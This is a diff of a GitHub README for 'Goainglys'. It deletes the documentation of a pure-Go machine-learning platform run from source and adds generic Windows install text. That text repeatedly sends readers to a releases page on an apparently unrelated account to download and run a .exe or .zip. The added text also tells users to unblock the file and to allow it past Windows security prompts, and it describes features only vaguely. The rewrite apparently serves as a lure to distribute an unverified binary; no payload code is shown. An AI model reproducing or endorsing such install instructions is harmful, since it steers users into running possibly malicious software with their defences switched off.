@@ -1,212 +1,257 @@
-<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/5ce1d992-426b-4b65-8e84-c09186bdb215" />
+# 🤖 Goainglys - Run Go AI Tools with Ease
 
-# Goainglys - Native Go ML Platform
+[![Download Goainglys](https://img.shields.io/badge/Download-Goainglys-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Natalyarevenant458/Goainglys/releases)
 
-A comprehensive machine learning platform written entirely in **pure Go** with **zero external dependencies**. Implements 15+ distinct ML components from tensors to production APIs.
+## 🚀 Getting Started
 
-## Architecture
+Goainglys is a Go AI framework for Windows users who want to run AI tools without a hard setup. It is built for people who want a direct way to get started, use local models, and work with AI tasks in a simple app flow.
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                              Goainglys ML Platform                           │
-├─────────────────────────────────────────────────────────────────────────────┤
-│                                                                              │
-│  ┌──────────────────────────┐    ┌───────────────────────────────────────┐  │
-│  │      Core Foundation     │    │           MLOps & Tooling             │  │
-│  ├──────────────────────────┤    ├───────────────────────────────────────┤  │
-│  │ tensor/     Tensor ops   │    │ portal/       Unified web platform    │  │
-│  │ nn/         NN layers    │    │ dashboard/    Training metrics        │  │
-│  │ transformer/ Full model  │    │ model_registry/ Version control      │  │
-│  └──────────────────────────┘    │ marketplace/  MCP apps marketplace    │  │
-│                                  └───────────────────────────────────────┘  │
-│  ┌──────────────────────────┐    ┌───────────────────────────────────────┐  │
-│  │     Specialized ML       │    │             AI Agents                │  │
-│  ├──────────────────────────┤    ├───────────────────────────────────────┤  │
-│  │ transformers/ GPT/BERT   │    │ agents/       ReAct, Plan-Execute    │  │
-│  │ vector_db/   HNSW index  │    │ self_improving_agents/               │  │
-│  │ asr/         Speech      │    │            Recursive improvement     │  │
-│  │ finetune/    LoRA tuning │    └───────────────────────────────────────┘  │
-│  └──────────────────────────┘                                               │
-│                                                                              │
-│  ┌──────────────────────────────────────────────────────────────────────┐   │
-│  │                      Advanced Research                               │   │
-│  ├──────────────────────────────────────────────────────────────────────┤   │
-│  │ Mixture of Experts │ Diffusion Models │ RL Agents │ Graph Neural Nets│   │
-│  └──────────────────────────────────────────────────────────────────────┘   │
-│                                                                              │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
+This guide shows you how to download Goainglys, install it on Windows, and open it for the first time.
 
-## Projects
+## 📥 Download Goainglys
 
-| Project | Description | Status |
-|---------|-------------|--------|
-| **tensor/** | Core tensor operations with gradient tracking | Complete |
-| **nn/** | Unified neural network layers and optimizers | Complete |
-| **transformer/** | Full Transformer (Vaswani et al., 2017) with backprop | Complete |
-| **transformers/** | Native GPT-2 and BERT implementations | Complete |
-| **vector_db/** | HNSW-based vector similarity search | Complete |
-| **asr/** | Speech recognition with MFCC & LSTM | Complete |
-| **finetune/** | Fine-tuning with LoRA, AdamW, Lion optimizers | Complete |
-| **agents/framework/** | ReAct, Plan-Execute, Supervisor agents | Complete |
-| **self_improving_agents/** | Recursive self-improvement system | Complete |
-| **Advanced-Research/** | MoE, Diffusion, RL, GraphNN implementations | Complete |
-| **rag_eval/** | RAG/LLM evaluation toolkit | Complete |
-| **dashboard/** | Real-time training metrics visualization | Complete |
-| **model_registry/** | Model versioning and staging system | Complete |
-| **marketplace/** | MCP apps marketplace with REST API | Complete |
-| **portal/** | Unified web platform (all services combined) | Complete |
-| **benchmarks/** | Performance benchmark suites | Complete |
+Visit this page to download the latest version:
 
-## Quick Start
+https://github.com/Natalyarevenant458/Goainglys/releases
 
-```bash
-# Transformer demo
-cd /home/runner/workspace && GOWORK=off go run main.go
+On the releases page, look for the newest release at the top. Download the Windows file that matches your system. If you see a `.zip` file, download that file and extract it first. If you see an `.exe` file, you can run it after the download finishes.
 
-# Vector database
-cd vector_db && GOWORK=off go run .
+## 🪟 Windows Setup
 
-# ASR pipeline
-cd asr && GOWORK=off go run cmd/main.go
+Before you start, make sure you have:
 
-# Agent framework
-cd agents/framework && GOWORK=off go run main.go
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 2 GB of free disk space
+- Permission to open downloaded apps
 
-# Fine-tuning
-cd finetune && GOWORK=off go run main.go
+If your computer has more memory and a newer CPU, Goainglys will run better. A GPU can help with AI tasks, but it is not required for basic use.
 
-# GPT/BERT
-cd transformers && GOWORK=off go run main.go
+### Step 1: Open the release page
 
-# Web services
-cd dashboard && go run main.go        # :8080
-cd model_registry && go run main.go   # :8081
-cd marketplace && go run main.go      # :8082
-cd portal && go run main.go           # :8083 (unified)
-```
+Go to:
 
-## Performance
+https://github.com/Natalyarevenant458/Goainglys/releases
 
-| Component | Metric | Value |
-|-----------|--------|-------|
-| Transformer | Training | ~2.5s/epoch |
-| Transformer | Backprop | ~8s/epoch |
-| Vector DB | Insert | 10k vectors/s |
-| Vector DB | Search | ~20µs |
-| ASR | Speed | 75x realtime |
-| RAG Eval | Throughput | 10k evals/s |
+### Step 2: Download the Windows file
 
-## Core Components
+Find the latest release and choose the Windows download. The file name may include words like:
 
-### Tensor Operations (`tensor/`)
-```go
-type Tensor struct {
-    Data    []float64
-    Shape   []int
-    Grad    []float64
-    ReqGrad bool
-}
-```
+- windows
+- win
+- x64
+- setup
+- portable
 
-### Transformer Config (`transformer/`)
-```go
-type Config struct {
-    ModelDim  int
-    NumHeads  int
-    NumLayers int
-    FFNDim    int
-    VocabSize int
-    MaxSeqLen int
-    Dropout   float64
-}
-```
+If there are several files, choose the one that best fits your PC. Most modern Windows PCs use `x64`.
 
-### Agent Framework (`agents/framework/`)
-```go
-agent := agents.NewReActAgent(config, llmProvider)
-result := agent.Run(ctx, "Your task here")
-```
+### Step 3: Extract the file if needed
 
-## API Endpoints
+If the download is a `.zip` file:
 
-### Portal (Unified Platform)
-- `GET /api/dashboard/metrics` - Training metrics
-- `GET /api/models` - Model registry
-- `GET /api/marketplace/apps` - Marketplace apps
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder
+4. Wait for Windows to finish unpacking the files
 
-### Marketplace
-- `GET /api/apps` - List apps
-- `GET /api/apps/search?q=` - Search
-- `POST /api/apps` - Register app
-- `GET /api/stats` - Statistics
+If the download is an `.exe` file, you do not need to extract anything.
 
-### Model Registry
-- `GET /api/models` - List models
-- `POST /api/models` - Create model
-- `GET /api/models/:id/versions` - List versions
-- `PUT /api/models/:id/versions/:v` - Update stage
+### Step 4: Run Goainglys
 
-## Design Principles
+If you downloaded an `.exe` file:
 
-1. **Zero Dependencies** - Only Go standard library
-2. **Full Transparency** - Complete algorithm implementations, no black boxes
-3. **Modular Design** - Each module is independently importable
-4. **Production Ready** - REST APIs, web UIs, persistence
+1. Double-click the file
+2. If Windows asks for permission, click Yes
+3. Wait for the app to open
 
-## Directory Structure
+If you extracted a `.zip` file:
 
-```
-/workspace/
-├── tensor/                 # Tensor data structures & math
-├── nn/                     # Unified NN layers, optimizers, schedulers
-├── transformer/            # Full Transformer with backpropagation
-├── transformers/           # GPT-2 and BERT implementations
-├── vector_db/              # HNSW vector database
-├── asr/                    # Speech recognition (MFCC, LSTM, CTC)
-├── finetune/               # Fine-tuning with LoRA support
-├── agents/framework/       # AI agent framework
-├── self_improving_agents/  # Recursive self-improvement
-├── Advanced-Research/      # MoE, Diffusion, RL, GraphNN
-├── rag_eval/               # RAG/LLM evaluation toolkit
-├── dashboard/              # Training metrics dashboard
-├── model_registry/         # Model versioning system
-├── marketplace/            # MCP apps marketplace
-├── portal/                 # Unified web platform
-├── benchmarks/             # Performance benchmarks
-├── opencode-lrs-agents-nbx/# Distributed training components
-└── main.go                 # Root demo
-```
+1. Open the folder you extracted
+2. Find the main app file
+3. Double-click it to start Goainglys
 
-## Key Files
+## 🧭 First Launch
 
-| File | Purpose |
-|------|---------|
-| `tensor/tensor.go` | Core tensor with gradient support |
-| `tensor/ops.go` | Mathematical operations (matMul, softmax, etc.) |
-| `transformer/model.go` | Complete encoder-decoder architecture |
-| `transformer/backward.go` | Full backpropagation implementation |
-| `nn/layers.go` | Linear, Embedding, LayerNorm layers |
-| `nn/optimizers.go` | Adam, AdamW, SGD, Lion, RMSprop |
-| `vector_db/hnsw.go` | HNSW ANN search index |
-| `asr/model.go` | LSTM acoustic model |
-| `agents/framework/core/types.go` | Agent, Tool, Message types |
-| `portal/main.go` | Unified platform entry point |
+The first time you open Goainglys, it may take a little longer to start. This is normal.
 
-## Benchmarks
+When the app opens, you may see options for:
 
-Run the benchmark suite:
+- AI agent tools
+- Model setup
+- Project files
+- Local runtime settings
+- ML workflow tools
 
-```bash
-cd benchmarks
-go test -bench=. ./...
-```
+Start with the default settings if you are not sure what to choose. The app is designed to guide you through common tasks without complex setup.
 
-Benchmarks cover tensor operations, transformer training, ASR pipeline, and vector DB performance.
+## ⚙️ Basic Use
 
-## License
+Goainglys is made for AI work on Go. You can use it for tasks such as:
 
-MIT License - Free to use, modify, and distribute.
+- Running AI agents
+- Testing AI tools
+- Managing local models
+- Handling ML workflows
+- Working with transformer-based features
+- Organizing AI experiments
 
----
-*Built with pure Go - zero external dependencies*
+If the app gives you choices for model paths, workspace folders, or runtime settings, you can keep the defaults at first. Later, you can change them if you need a custom setup.
+
+## 🗂️ Suggested Folder Setup
+
+For easier use, keep your files in simple folders like these:
+
+- `C:\Goainglys\`
+- `C:\Goainglys\Models\`
+- `C:\Goainglys\Projects\`
+- `C:\Goainglys\Exports\`
+
+A clean folder layout helps when you save models, logs, or project files. It also makes it easier to find things later.
+
+## 🔍 What Goainglys Can Help With
+
+Goainglys fits common AI and ML tasks in a single place. It can help you with:
+
+- AI agent work
+- Model testing
+- Prompt-based workflows
+- Local inference tasks
+- ML engineering tasks
+- Experiment tracking
+- Go-based automation
+- Tool chaining through MCP-style workflows
+
+It is useful if you want a simple desktop app for AI tasks instead of setting up many separate tools.
+
+## 🖥️ System Needs
+
+For smooth use on Windows, use the following as a guide:
+
+- **OS:** Windows 10 or Windows 11
+- **CPU:** 64-bit processor
+- **RAM:** 4 GB minimum, 8 GB or more recommended
+- **Storage:** 2 GB free space minimum
+- **Network:** Needed for downloads and updates
+- **Extras:** GPU support can help with larger AI tasks
+
+If you plan to work with larger models or multiple AI jobs, more RAM will help.
+
+## 🛠️ Common Install Problems
+
+### The file will not open
+
+If Windows blocks the file:
+
+1. Right-click the file
+2. Select Properties
+3. Look for an Unblock option
+4. Apply the change
+5. Try opening the file again
+
+### Windows shows a security prompt
+
+This can happen with files from GitHub releases. If you downloaded the file from the release page and it matches the latest release, choose the option that lets the app run.
+
+### The app closes right away
+
+Try these steps:
+
+1. Reboot your PC
+2. Open the app again
+3. Make sure you downloaded the correct Windows file
+4. Check that the file was fully extracted if it came in a zip
+
+### The app opens but looks empty
+
+This may mean it still needs a model path, workspace folder, or first-run setup. Open the settings area and check the default values before changing anything.
+
+## 📌 Download and Install Again
+
+If you need the file again, use this page:
+
+https://github.com/Natalyarevenant458/Goainglys/releases
+
+That page always has the latest release files for Windows. Download the file, then run it or extract it based on the file type.
+
+## 🧩 File Types You May See
+
+Here is a quick guide:
+
+- `.exe` — run this file
+- `.zip` — download this file, then extract it
+- `.msi` — run this installer if the release offers one
+- `.tar.gz` — usually not for Windows, unless the release says so
+
+For most Windows users, the best choice is the `.exe` or `.zip` file marked for Windows.
+
+## 🧠 Tips for Better Use
+
+- Keep Goainglys in a simple folder
+- Use short folder names
+- Save models in one place
+- Keep your project files separate from downloads
+- Start with small tasks before moving to larger ones
+- Update to the newest release when you want fixes or new features
+
+## 📖 Quick Start Checklist
+
+- Open the release page
+- Download the Windows file
+- Extract it if needed
+- Run the app
+- Keep default settings at first
+- Set your model or project folder
+- Start your first AI task
+
+## 🧪 Typical Use Cases
+
+Goainglys can fit different AI workflows on a Windows PC:
+
+- A user testing a local AI model
+- A small team tracking ML experiments
+- A developer using Go for AI automation
+- A user exploring agent-based workflows
+- A person managing prompts and model files in one place
+
+## 📁 Release Page Reference
+
+Primary download page:
+
+https://github.com/Natalyarevenant458/Goainglys/releases
+
+Use this link when you need the newest Windows build or want to check for updates
+
+## 🔧 Built With
+
+Goainglys is built around:
+
+- Go
+- AI agent workflows
+- Machine learning tools
+- ML engineering patterns
+- Model tracking ideas
+- Transformer support
+- MCP-style integration
+- Windows desktop use
+
+## 🪄 What to Expect After Setup
+
+After you install and open Goainglys, you should be able to:
+
+- Launch the app from your Windows machine
+- Open the main workspace
+- Set a model path
+- Work with AI tools
+- Save project files
+- Return to the app later without repeating setup
+
+## 🧷 Useful Path Example
+
+If you want a simple place for files, use this pattern:
+
+- App: `C:\Goainglys\Goainglys.exe`
+- Models: `C:\Goainglys\Models\`
+- Projects: `C:\Goainglys\Projects\`
+
+This keeps the app and your files in one easy place to manage
